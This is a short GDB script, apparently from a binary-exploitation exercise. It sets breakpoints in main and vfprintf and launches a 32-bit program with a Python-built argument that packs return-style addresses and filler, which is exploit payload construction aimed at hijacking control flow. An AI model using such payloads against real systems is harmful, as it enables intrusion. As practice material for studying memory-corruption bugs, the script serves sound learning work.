set disassembly-flavor intel
set height 0

b* main
commands 1
    c
end

b* main+203
commands 2
    x/x $esp+0x11c
    b* vfprintf+26
    b* vfprintf+310
end

r test.txt $(python -c 'print "\x33\xf5\xd5\xd5"+"\x4a\xff\xd5\xd5"*8+"\x33\xf5\xd5\xd5"*35+"BBBB"*20+"\x47\xf4\xd5\xd5"+"C"*4+"D"*4+"E"*4+"F"*4+"G"*4+"\x4a\x93\xd6\xdd"+"I"*4+"J"*4')


